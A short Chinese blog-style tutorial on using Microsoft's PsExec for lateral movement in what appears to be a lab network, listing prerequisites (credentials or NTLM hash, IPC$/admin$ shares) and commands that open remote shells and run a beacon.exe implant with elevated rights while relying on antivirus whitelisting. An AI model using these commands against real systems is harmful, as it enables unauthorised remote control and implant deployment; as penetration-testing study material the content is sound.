---
title: "PsExec远程控制"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# PsExec远程控制

psexec是微软官方提供的远控工具，使用不需要对方主机开方3389端口，

只需要对方开启admin$共享和ipc$ (该共享默认开启，依赖于445端口)。但是，假如目标主机开启了防火墙（防火墙禁止445端口连接），psexec也是不能使用的，会提示找不到网络路径。由于psexec是Windows提供的工具，有微软的签名，所以杀软将其列在白名单中

[PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/zh-cn/sysinternals/downloads/psexec)

### 使用条件

* 具有正确的凭证（内存凭证、账号密码、账号NTLM Hash）

* 能建立IPC链接（也就是需要通过smb认证的），且目标机器开启了共享（默认开启的），并且目标共享中必须有admin$共享

### 使用

常用参数：

~~~cmd
psexec \\ip -u administrator -p admin cmd 	# 进⼊半交互式shell
PsExec -accepteula \\ip -s cmd.exe 	# 建立交互的shell
psexec \\ip - uadministrator -p admin -w c:\cmd 	# 进⼊交互式shell，且c:\是⽬标机器的⼯作⽬录
psexec \\ip -u administrator -p admin whoami all 	# 执行命令
psexec \\ip -u administrator -p admin -d c:\beacon.exe 		# 执行文件
psexec \\ip -u administrator -p admin -h -d c:\beacon.exe UAC	# 的⽤⼾权限执行文件
~~~

场景中的使用：

* 建立IPC连接

* 启动psexec：

  ~~~cmd
  PsExec.exe -accepteula \\192.168.111.132 -u yuy0ung\administrator -p Admin123456 -i cmd.exe	# 返回交互shell（远程到桌面，我CS和msf不行）
  
  psexec64.exe -accepteula \\192.168.111.137 -s ipconfig	# 远程执行命令
  ~~~

  ![image-20241027192030775](https://img2023.cnblogs.com/blog/3450279/202410/3450279-20241027192033630-803710958.png)

impacket套件中的psexec.py也可以实现，具体可以参考我的另一篇文章[impacket使用总结]()
